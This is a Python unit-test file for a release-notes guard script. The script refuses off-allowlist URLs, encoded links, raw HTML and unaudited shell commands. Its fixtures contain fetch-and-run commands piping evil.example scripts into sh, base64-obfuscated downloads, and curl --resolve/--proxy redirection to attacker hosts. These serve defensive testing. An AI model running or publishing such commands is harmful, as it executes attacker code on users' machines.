#!/usr/bin/env python3
"""Direct unit tests for scripts/release_notes_validate.py — the
release-notes output-boundary guard (ADR-0618). The design under test:
presence-refusal plus real parsers. Literal URL candidates are judged by
urllib.parse.urlsplit (userinfo, ports, off-allowlist hosts refused; code
fences included, a fenced command is a copy-paste target); encodable
material outside code fences — entity sequences, backslash escapes of
URL-shaping punctuation — is refused by presence, never decoded; raw HTML
tags outside fences and protocol-relative destinations are refused; the
payload is decoded by json and its strings judged the same way; internal
reference ids are refused anywhere.

Run: python3 scripts/tests/test_release_notes_validate.py
"""

from __future__ import annotations

import json
import unittest

from script_loader import ROOT, load

validator = load(
    "release_notes_validate", ROOT / "scripts" / "release_notes_validate.py"
)


class UrlAllowed(unittest.TestCase):
    """The URL judgment: a real parser, not prefix matching."""

    def test_allowed_hosts_and_forms(self) -> None:
        for url in (
            "https://github.com/relatedb/relate/pull/421",
            "https://github.com/relatedb",
            "https://relatedb.ai",
            "https://relatedb.ai/docs",
            "https://www.relatedb.ai/",
            "https://relatedb.ai/@oskar",
            "https://relatedb.ai/docs?ref=release",
            "HTTPS://GITHUB.COM/RELATEDB/x",
            "www.relatedb.ai",
            "www.relatedb.ai/docs",
            "https://example.com/graph",
            "https://localhost",
        ):
            self.assertTrue(validator.url_allowed(url), url)

    def test_off_allowlist_hosts_are_refused(self) -> None:
        for url in (
            "https://evil.example/x",
            "HTTPS://EVIL.EXAMPLE/x",
            "https://github.com/relatedb-evil/relate/pull/1",
            "https://github.com",
            "https://github.com/neo4j/neo4j",
            "http://relatedb.ai/docs",
            "www.evil.example",
        ):
            self.assertFalse(validator.url_allowed(url), url)

    def test_separator_spellings_are_normalized_like_a_browser(self) -> None:
        # A browser normalizes every post-scheme separator spelling to
        # `//`: the judgment follows the same rule. An allowed host in a
        # weird spelling passes; an off-allowlist host in any spelling
        # is refused; http stays http and is refused.
        for url in (
            "https:evil.example/x",
            "https:/evil.example/x",
            "https:\\evil.example/x",
            "https:\\/\\/evil.example/x",
            "HTTPS:EVIL.EXAMPLE/x",
            "http:relatedb.ai/docs",
            "http:/relatedb.ai/docs",
        ):
            self.assertFalse(validator.url_allowed(url), url)
        for url in (
            "https:relatedb.ai/docs",
            "https:/relatedb.ai/docs",
            "https:\\relatedb.ai/docs",
        ):
            self.assertTrue(validator.url_allowed(url), url)

    def test_userinfo_is_refused_its_allowed_prefix_notwithstanding(self) -> None:
        # relatedb.ai@evil.example IS evil.example: everything before an
        # @ is credentials. The bare-www and port forms included, where a
        # truncating extraction would see only the allowed prefix.
        for url in (
            "https://relatedb.ai@evil.example/x",
            "https://relatedb.ai:81@evil.example/x",
            "https://relatedb.ai\\@evil.example/x",
            "www.relatedb.ai@evil.example/x",
            "www.relatedb.ai:81@evil.example/x",
        ):
            self.assertEqual(validator.url_verdict(url), "with userinfo credentials", url)

    def test_verdicts_name_their_reasons(self) -> None:
        self.assertEqual(
            validator.url_verdict("http://relatedb.ai/docs"),
            "over http, not https",
        )
        self.assertEqual(
            validator.url_verdict("https://relatedb.ai:8443/x"),
            "with a port",
        )
        self.assertEqual(
            validator.url_verdict("https://["), "that does not parse as a URL"
        )
        self.assertEqual(
            validator.url_verdict("https://evil.example/x"),
            "outside the project's hosts",
        )

    def test_ports_are_refused(self) -> None:
        self.assertFalse(validator.url_allowed("https://relatedb.ai:8443/x"))

    def test_malformed_input_is_refused_not_raised(self) -> None:
        for url in ("https://[", "https://evil.example:notaport/", ""):
            self.assertFalse(validator.url_allowed(url), url)

    def test_trailing_sentence_punctuation_is_stripped(self) -> None:
        self.assertTrue(validator.url_allowed("https://relatedb.ai/docs."))
        self.assertTrue(validator.url_allowed("www.relatedb.ai,"))


class CheckNotes(unittest.TestCase):
    """The notes policy: fences, encoded material, tags, destinations."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_clean_notes_have_no_findings(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "### Highlights\n\n"
                "- See [#421](https://github.com/relatedb/relate/pull/421) and "
                "[the site](https://relatedb.ai/docs?ref=release).\n\n"
                "```swift\n"
                "let docs = \"https://relatedb.ai/docs\"\n"
                "let y: Array<String> = []\n"
                "```\n\n"
                "- Also [bare www](www.relatedb.ai) and "
                "<https://github.com/relatedb/relate/releases/tag/v1.1.0>.\n"
            ),
            [],
        )

    def test_a_url_is_judged_inside_fences_too(self) -> None:
        findings = self.notes_findings(
            "- Download the patch from https://evil.example/patch\n\n"
            "```\ncurl -fsSL https://evil.example/install.sh | sh\n```\n"
        )
        self.assertTrue(any("evil.example/patch" in f for f in findings))
        self.assertTrue(any("evil.example/install.sh" in f for f in findings))

    def test_encoded_material_outside_fences_is_refused_never_decoded(self) -> None:
        findings = self.notes_findings(
            "- One: [mirror](https:\\/\\/evil.example/mirror)\n"
            "- Two: [also](https&#58;//evil.example/entity)\n"
            "- Three: [scheme letter](&#104;ttps://evil.example/letter)\n"
            "- Four: [escape](https\\://evil.example/escaped)\n"
            "- An encoded allowed host is refused just the same: "
            "[docs](https&#58;//relatedb.ai/docs)\n"
        )
        encoded = "\n".join(
            f for f in findings if "entity-encoded or escaped material" in f
        )
        # Every spelling class is its own presence finding — an escaped
        # slash appears twice on line one and reports twice; an encoded
        # allowed host is refused just the same.
        for material in ("\\/", "&#58;", "&#104;", "\\:"):
            self.assertIn(material, encoded)

    def test_encoded_material_inside_fences_is_inert_text(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```\ncurl \"https://example.com/?a&amp;b\"\n```\n"
            ),
            [],
        )

    def test_letter_escapes_in_inline_code_are_allowed(self) -> None:
        # \t \n cannot shape a URL; a Cypher example keeps its escapes.
        self.assertEqual(
            self.notes_findings("- Run `RETURN 'a\\tb'` and `MATCH (n) RETURN n`."),
            [],
        )

    def test_raw_html_tags_outside_fences_any_name(self) -> None:
        findings = self.notes_findings(
            "<details><summary>Changelog</summary>\n"
            "<div class=\"note\">x</div>\n"
            "<img src=\"https://evil.example/pixel\">\n"
            "</details>\n\n"
            "```html\n<script>alert(1)</script>\n```\n"
        )
        joined = "\n".join(findings)
        for tag in ("<details", "<summary", "<div", "<img"):
            self.assertIn(tag, joined)
        self.assertNotIn("<script", joined)

    def test_angle_autolink_evil_is_judged_as_a_url(self) -> None:
        findings = self.notes_findings("- Get it from <https://evil.example/relate>\n")
        self.assertTrue(any("evil.example/relate" in f for f in findings))

    def test_protocol_relative_destinations_are_refused(self) -> None:
        for text in (
            "- [the patch](//evil.example/patch)\n",
            "- [the patch](<//evil.example/patch>)\n",
            "[assets]: //evil.example/assets\n",
        ):
            findings = self.notes_findings(text)
            self.assertTrue(
                any("protocol-relative" in f for f in findings), text
            )

    def test_a_scheme_less_separator_destination_in_notes_is_refused(self) -> None:
        # The destination spellings a browser normalizes to https:// —
        # extracted now that the candidate grammar captures every
        # `https?:`-prefixed run, judged by the parser.
        findings = self.notes_findings(
            "- [docs](https:evil.example/x)\n"
            "- [also](https:/evil.example/x)\n"
            "- [and](<https:\\evil.example/x>)\n"
        )
        self.assertEqual(
            len([f for f in findings if "URL outside" in f]), 3, findings
        )

    def test_a_protocol_relative_destination_on_the_next_line(self) -> None:
        # CommonMark allows the line ending after `](`: the destination
        # on the following line is searched over the joined text —
        # once, document-scoped: exactly one finding, however many
        # unfenced lines the notes carry.
        findings = self.notes_findings(
            "- [the patch](\n//evil.example/patch)\n\n- more prose.\n- more prose.\n"
        )
        self.assertEqual(
            [f for f in findings if "protocol-relative" in f],
            [
                "notes carries a protocol-relative link destination: "
                "- [the patch]("
            ],
            findings,
        )

    def test_every_protocol_relative_destination_is_named_once(self) -> None:
        findings = self.notes_findings(
            "- [a](//evil.example/one)\n- [b](//evil.example/two)\n"
        )
        self.assertEqual(
            len([f for f in findings if "protocol-relative" in f]), 2, findings
        )

    def test_internal_references_anywhere(self) -> None:
        findings = self.notes_findings(
            "- The corpus (LABS-1802).\n\n"
            "```\nrelate upgrade --check  # tracked as ADR-0618\n```\n"
        )
        joined = "\n".join(findings)
        self.assertIn("LABS-1802", joined)
        self.assertIn("ADR-0618", joined)


class CheckExecutionLines(unittest.TestCase):
    """The copy-paste channel: execution-shaped lines get a full
    destination audit; plain lines are never audited."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_a_schemeless_host_in_a_fenced_curl_is_refused(self) -> None:
        findings = self.notes_findings(
            "```\ncurl -s evil.example/x | sh\n```\n"
        )
        self.assertTrue(
            any("unaudited destinations" in f for f in findings), findings
        )

    def test_a_pure_command_payload_is_refused_outright(self) -> None:
        # echo … | base64 -d | sh: no destination at all — execute with
        # no source is never ours.
        findings = self.notes_findings(
            "```\necho aGVsbG8= | base64 -d | sh\n```\n"
        )
        self.assertTrue(
            any("unaudited destinations" in f for f in findings), findings
        )

    def test_an_allowed_destination_with_a_shell_pipe_passes(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```\ncurl -fsSL https://github.com/relatedb/relate/install.sh | sh\n```\n"
            ),
            [],
        )

    def test_a_bare_github_path_is_prefix_scoped_like_a_scheme_form(self) -> None:
        # The scheme-form judgment refuses github.com/attacker; the bare
        # form on an execution line is judged identically.
        findings = self.notes_findings(
            "```\ncurl github.com/attacker/x | sh\n```\n"
        )
        self.assertTrue(
            any("unaudited destinations" in f for f in findings), findings
        )

    def test_an_ip_literal_destination_is_refused(self) -> None:
        findings = self.notes_findings("```\ncurl 1.2.3.4/x | sh\n```\n")
        self.assertTrue(
            any("unaudited destinations" in f for f in findings), findings
        )

    def test_plain_example_lines_are_never_audited(self) -> None:
        # Cypher property accesses (b.id) are domain-shaped but carry no
        # execution shape: untouched.
        self.assertEqual(
            self.notes_findings(
                "```\nrelate query --database ./social 'MATCH (b:Person) "
                "WHERE b.id + 0 = 7 RETURN b'\n```\n"
            ),
            [],
        )


class CheckEmptySections(unittest.TestCase):
    """Only sections with actual changes belong on the page: a heading
    with no content before the next heading is refused."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_an_empty_group_section_is_refused(self) -> None:
        findings = self.notes_findings(
            "### Changes by area\n\n"
            "#### Performance & memory\n\n"
            "#### CLI\n\n"
            "- A flag changed default (#101).\n"
        )
        self.assertTrue(
            any(
                "empty section" in f and "Performance & memory" in f
                for f in findings
            ),
            findings,
        )

    def test_a_section_with_content_passes(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "### Changes by area\n\n"
                "#### Performance & memory\n\n"
                "- Queries answer from the index (#101).\n\n"
                "#### Internal\n\n"
                "- Plus internal maintenance pull requests — see below.\n"
            ),
            [],
        )

    def test_a_heading_inside_a_fence_is_example_text_not_a_section(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```\n#### a heading inside an example\n```\n\n"
                "- Real content.\n"
            ),
            [],
        )

    def test_a_section_whose_only_body_is_a_fence_is_not_empty(self) -> None:
        # The rendered page shows a code block under this heading — the
        # empty-section rule counts fenced bodies as content.
        self.assertEqual(
            self.notes_findings(
                "#### CLI\n\n```\nrelate --version\n```\n"
            ),
            [],
        )


class CheckGrammarEdges(unittest.TestCase):
    """The two grammar edges the security rounds found: an
    four-space-indented fence marker is an indented code block (its
    marker is literal text, not a fence), and a backslash-escaped URL —
    in a fence or not — is extracted and refused by the parser rather
    than missed."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_an_indented_fence_marker_does_not_open_a_fence(self) -> None:
        # The ``` line is indented four spaces: an indented code block.
        # The entity line at zero indent is ordinary markdown and MUST
        # be checked.
        findings = self.notes_findings(
            "    ```\n- [docs](https&#58;//evil.example/entity)\n    ```\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )

    def test_a_backslash_escaped_url_in_a_fence_is_refused(self) -> None:
        # A copy-pasted shell strips the backslash: the URL is live. Each
        # escape spelling is refused on its own line — asserted per case,
        # so a count from another line can never mask a miss.
        for escaped in ("https\\://evil.example/payload", "https:\\/\\/evil.example\\/x"):
            findings = self.notes_findings(f"```\nwget {escaped}\n```\n")
            self.assertTrue(
                findings, f"not refused: {escaped}"
            )

    def test_plain_urls_are_unaffected_by_the_escape_tolerant_scheme(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```\ncurl -fsSL https://github.com/relatedb/relate/install.sh | sh\n```\n"
            ),
            [],
        )

    def test_installer_and_vcs_commands_get_the_destination_audit(self) -> None:
        # pip/docker/git-clone lines carry bare-host destinations a
        # reader will copy-paste; the audit signature covers them.
        for line in (
            "pip install --index-url evil.example/simple relate-db",
            "docker run evil.example/relate",
            "git clone evil.example/relate",
            "npm install --registry evil.example",
        ):
            findings = self.notes_findings(f"```\n{line}\n```\n")
            self.assertTrue(findings, f"not refused: {line}")

    def test_an_installer_line_without_a_destination_passes(self) -> None:
        self.assertEqual(
            self.notes_findings("```\npip install relate-db\n```\n"),
            [],
        )

    def test_shell_obfuscated_fetch_and_run_is_refused(self) -> None:
        # Quotes reassembled by the tokenizer (`127.0.0.'1'` is the
        # token `127.0.0.1`, refused as a port); a destination hidden
        # in substitution or base64 leaves a fetch with nothing judged;
        # `&&` execution is as much execution as a pipe.
        for line in (
            "curl 127.0.0.'1':8765/ -o /tmp/p && sh /tmp/p",
            'curl "$(echo aHR0cHM6Ly9ldmlsLmV4YW1wbGUveA== | base64 -d)" -o /tmp/p && sh /tmp/p',
            "wget $(cat /tmp/url) -O /tmp/p && sh /tmp/p",
            "curl 'https://evil.example'\"/x\" -o p && sh p",
        ):
            findings = self.notes_findings(f"```\n{line}\n```\n")
            self.assertTrue(findings, f"not refused: {line}")

    def test_a_quoted_allowed_fetch_still_passes(self) -> None:
        # The tokenizer reassembles the quotes; the destination is the
        # project's own.
        self.assertEqual(
            self.notes_findings(
                "```\ncurl -fsSL 'https://github.com/relatedb/relate/install.sh' | sh\n```\n"
            ),
            [],
        )


class CheckRoundThreeGrammar(unittest.TestCase):
    """The third grammar round: a closing delimiter splitting off a
    userinfo suffix, a backtick fence opener whose info string carries
    a backtick, and clickable non-web schemes."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_a_delimiter_split_userinfo_suffix_is_judged_whole(self) -> None:
        # The run ends at `)` but the rendered href carries the
        # userinfo: the continuation up to whitespace/angle bracket
        # joins the judged candidate.
        for text in (
            "<https://relatedb.ai)@evil.example/x>\n",
            "- [docs](<https://relatedb.ai)@evil.example/x>)\n",
            "- [docs](https://relatedb.ai)@evil.example/x)\n",
        ):
            findings = self.notes_findings(text)
            self.assertTrue(
                any("userinfo" in f for f in findings), text
            )

    def test_prose_after_a_link_does_not_extend_the_candidate(self) -> None:
        # The continuation stops at whitespace: an @ far away in the
        # same line is not the candidate's userinfo.
        self.assertEqual(
            self.notes_findings(
                "- [docs](https://relatedb.ai/x) — write to someone@relatedb.ai\n"
            ),
            [],
        )

    def test_a_backtick_fence_opener_with_a_backtick_info_string_is_text(self) -> None:
        # CommonMark rejects the opener; the following markdown renders
        # live, so the entity line is checked.
        findings = self.notes_findings(
            "```evil`x\n[x](https&#58;//evil.example/pwn)\n```\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )

    def test_a_clean_info_string_still_opens_the_fence(self) -> None:
        self.assertEqual(
            self.notes_findings(
                "```js\n[x](https&#58;//evil.example/pwn)\n```\n"
            ),
            [],
        )

    def test_clickable_non_web_schemes_are_refused(self) -> None:
        for text in (
            "- [contact](mailto:attacker@evil.example)\n",
            "- [x](data:text/html,hi)\n",
            "- [mirror](ftp://evil.example/x)\n",
        ):
            findings = self.notes_findings(text)
            self.assertTrue(
                any("scheme that is not ours" in f for f in findings),
                text,
            )

    def test_an_email_shaped_angle_autolink_is_never_exempt(self) -> None:
        # `<https@evil.example>` is an email autolink - CommonMark
        # renders a clickable mailto - not a scheme autolink: the tag
        # exemption requires the `://` continuation.
        findings = self.notes_findings("- write to <https@evil.example>\n")
        self.assertTrue(findings, findings)
        # The real autolink form stays exempt and judged as its URL.
        self.assertEqual(
            self.notes_findings(
                "- see <https://github.com/relatedb/relate/pull/421>\n"
            ),
            [],
        )

    def test_a_list_scoped_fence_ends_at_the_dedent(self) -> None:
        # CommonMark ends the list item - and its fence - at the first
        # non-blank line indented less than the item's content indent:
        # the markdown there renders LIVE (verified against a parser).
        findings = self.notes_findings(
            "- ```\n[x](https&#58;//evil.example/pwn)\n  ```\n- after\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )
        # Content indented to the item's indent stays fenced and inert.
        self.assertEqual(
            self.notes_findings(
                "- ```\n  [x](https&#58;//evil.example/pwn)\n  ```\n- after\n"
            ),
            [],
        )

    def test_a_list_scoped_closer_at_the_content_indent(self) -> None:
        # After the item ends at the dedented line, an indented marker
        # line re-opens at top level and swallows what follows (inert);
        # a four-space marker line is an indented code block's start,
        # and the markdown after IT renders live and is checked.
        self.assertEqual(
            self.notes_findings(
                "- ```\ncode\n  ```\n[x](https&#58;//evil.example/x)\n"
            ),
            [],
        )
        findings = self.notes_findings(
            "- ```\ncode\n    ```\n[x](https&#58;//evil.example/x)\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )

    def test_a_wide_gap_after_the_marker_is_an_indented_code_block(self) -> None:
        # Five or more spaces after the list marker: the renderer sees
        # an indented code block inside the item, not a fence opener -
        # and the dedented markdown after it renders live.
        findings = self.notes_findings(
            "-     ```\n[x](https&#58;//evil.example/x)\n- after\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )
        # The renderer sees a raw-HTML comment block: a fence marker
        # inside it never opens a fence, so the markdown after the
        # comment stays live and checked.
        findings = self.notes_findings(
            "<!--\n```\n-->\n[x](https&#58;//evil.example/x)\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )
        # A single-line comment does not eat the document either.
        self.assertEqual(
            self.notes_findings(
                "<!-- one line -->\n\n```js\ncode\n```\n- after\n"
            ),
            [],
        )

    def test_a_reference_definition_destination_on_the_next_line(self) -> None:
        findings = self.notes_findings("[x]:\n//evil.example/y\n")
        self.assertTrue(
            any("protocol-relative" in f for f in findings), findings
        )

    def test_the_project_remote_installer_is_audited(self) -> None:
        for line in (
            "relate extension install x --github attacker/x@v1",
            "relate extension install x --url https://evil.example/p",
            "relate extension install x --from evil.example/dir",
            "relate extension install x --github",
        ):
            findings = self.notes_findings(f"```\n{line}\n```\n")
            self.assertTrue(findings, f"not refused: {line}")
        # The project's own channel and the signed default pass.
        self.assertEqual(
            self.notes_findings(
                "```\nrelate extension install x --github relatedb/ext@v1\n```\n"
            ),
            [],
        )
        self.assertEqual(
            self.notes_findings("```\nrelate extension install mytool\n```\n"),
            [],
        )

    def test_routing_and_insecure_flags_refuse_outright(self) -> None:
        # --resolve sends the request to an attacker host behind an
        # allowlisted literal URL; -k drops the check that makes the
        # allowlist mean anything. Space and = forms alike.
        for line in (
            "curl -k --resolve=github.com:443:evil.example https://github.com/relatedb/relate/install.sh | sh",
            "curl --resolve evil.example:443:github.com https://github.com/relatedb/relate/install.sh | sh",
            "curl --proxy=evil.example https://github.com/relatedb/relate/install.sh",
            "wget --proxy evil.example https://github.com/relatedb/relate/x",
            "curl --connect-to=github.com:443:evil.example:443 https://github.com/relatedb/relate/x",
        ):
            findings = self.notes_findings(f"```\n{line}\n```\n")
            self.assertTrue(findings, f"not refused: {line}")

    def test_destination_bearing_flag_values_are_judged(self) -> None:
        for line in (
            "pip install --index-url=evil.example/simple relate-db",
            "relate extension install x --url=https://evil.example/p",
            "relate extension install x --github=attacker/x@v1",
            "relate extension install x --from=evil.example/dir",
        ):
            findings = self.notes_findings(f"```\n{line}\n```\n")
            self.assertTrue(findings, f"not refused: {line}")
        # Benign flag values without a destination shape pass.
        self.assertEqual(
            self.notes_findings(
                "```\ncurl -fsSL -o=install.sh https://github.com/relatedb/relate/x | sh\n```\n"
            ),
            [],
        )

    def test_connect_string_schemes_judge_the_host_with_ports(self) -> None:
        # The honest form passes; the attacker host is refused by the
        # same table.
        self.assertEqual(
            self.notes_findings(
                "```\nrelate pull --url neo4j+s://localhost:7687\n```\n"
            ),
            [],
        )
        findings = self.notes_findings(
            "```\nrelate pull --url neo4j+s://evil.example\n```\n"
        )
        self.assertTrue(
            any("outside the project's hosts" in f for f in findings),
            findings,
        )


class CheckFenceTracking(unittest.TestCase):
    """The tracker speaks CommonMark's fence rules: a fence closes only
    at a same-character run at least as long as its opener — a shorter
    run or the other character inside is content."""

    def notes_findings(self, text: str) -> list[str]:
        return validator.check_text("notes", text, fence_aware=True)

    def test_a_short_inner_marker_is_content_not_a_close(self) -> None:
        # The whole span is inside a four-backtick fence: the renderer
        # shows the entity line as literal text, so the guard — agreeing
        # with the renderer — reports nothing.
        self.assertEqual(
            self.notes_findings(
                "````\n```\n[x](https&#58;//evil.example/pwn)\n````\n"
            ),
            [],
        )

    def test_a_proper_close_puts_following_markdown_outside(self) -> None:
        findings = self.notes_findings(
            "````\ncontent\n````\n[x](https&#58;//evil.example/pwn)\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )

    def test_the_other_fence_character_does_not_close(self) -> None:
        # ~~~ opens; a ``` line inside is content; the entity after the
        # proper ~~~ close is checked.
        findings = self.notes_findings(
            "~~~\n```\n~~~\n[x](https&#58;//evil.example/pwn)\n"
        )
        self.assertTrue(
            any("entity-encoded" in f for f in findings), findings
        )


class CheckPayload(unittest.TestCase):
    """The payload policy: json-decoded strings, the same judgment."""

    def payload_findings(self, document: object) -> list[str]:
        findings: list[str] = []
        for string in validator.iter_strings(document):
            findings.extend(
                validator.check_text("Slack payload", string, fence_aware=False)
            )
        return findings

    def test_clean_payload_passes(self) -> None:
        self.assertEqual(
            self.payload_findings(
                {
                    "text": "relate v1.1.0 released — "
                    "https://github.com/relatedb/relate/releases/tag/v1.1.0",
                    "blocks": [{"type": "rich_text", "elements": [{"text": "hi"}]}],
                }
            ),
            [],
        )

    def test_json_escapes_are_decoded_then_judged(self) -> None:
        # The raw file spelled the slashes \/; json decodes them, and the
        # decoded URL is judged — the same path main() takes.
        raw = r'{"text": "Install from https:\/\/evil.example\/relate"}'
        findings: list[str] = []
        for string in validator.iter_strings(json.loads(raw)):
            findings.extend(
                validator.check_text("Slack payload", string, fence_aware=False)
            )
        self.assertTrue(
            any("evil.example/relate" in f for f in findings), findings
        )

    def test_userinfo_and_refs_in_the_payload(self) -> None:
        findings = self.payload_findings(
            {"text": "Docs: https://relatedb.ai@evil.example/x (CIP-42)"}
        )
        joined = "\n".join(findings)
        self.assertIn("evil.example", joined)
        self.assertIn("CIP-42", joined)


class IterStrings(unittest.TestCase):
    def test_recursive_string_collection(self) -> None:
        document = {"a": "x", "b": ["y", {"c": "z"}], "d": 7, "e": None}
        self.assertEqual(validator.iter_strings(document), ["x", "y", "z"])


if __name__ == "__main__":
    unittest.main()
